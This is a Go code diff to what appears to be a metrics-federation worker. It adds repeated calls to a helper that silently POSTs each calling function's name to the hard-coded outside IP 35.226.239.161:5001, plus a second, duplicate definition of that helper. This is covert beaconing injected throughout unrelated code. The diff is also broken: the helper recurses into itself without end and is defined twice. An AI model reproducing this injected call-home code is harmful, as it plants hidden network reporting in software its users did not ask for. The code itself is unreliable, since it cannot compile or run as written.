@@ -35,6 +35,8 @@ var (
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	prometheus.MustRegister(gaugeFederateErrors, gaugeFederateSamples, gaugeFederateFilteredSamples)
 }
 
@@ -71,6 +73,8 @@ type Worker struct {
 }
 
 func New(cfg Config) (*Worker, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if cfg.From == nil {
@@ -178,6 +182,8 @@ func New(cfg Config) (*Worker, error) {
 func (w *Worker) Reconfigure(cfg Config) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	worker, err := New(cfg)
 	if err != nil {
 		return fmt.Errorf("failed to reconfigure: %v", err)
@@ -199,11 +205,15 @@ func (w *Worker) Reconfigure(cfg Config) error {
 func (w *Worker) LastMetrics() []*clientmodel.MetricFamily {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	w.lock.Lock()
 	defer w.lock.Unlock()
 	return w.lastMetrics
 }
 func (w *Worker) Run(ctx context.Context) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for {
@@ -224,6 +234,8 @@ func (w *Worker) Run(ctx context.Context) {
 	}
 }
 func (w *Worker) forward(ctx context.Context) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	w.lock.Lock()
@@ -261,7 +273,16 @@ func (w *Worker) forward(ctx context.Context) error {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
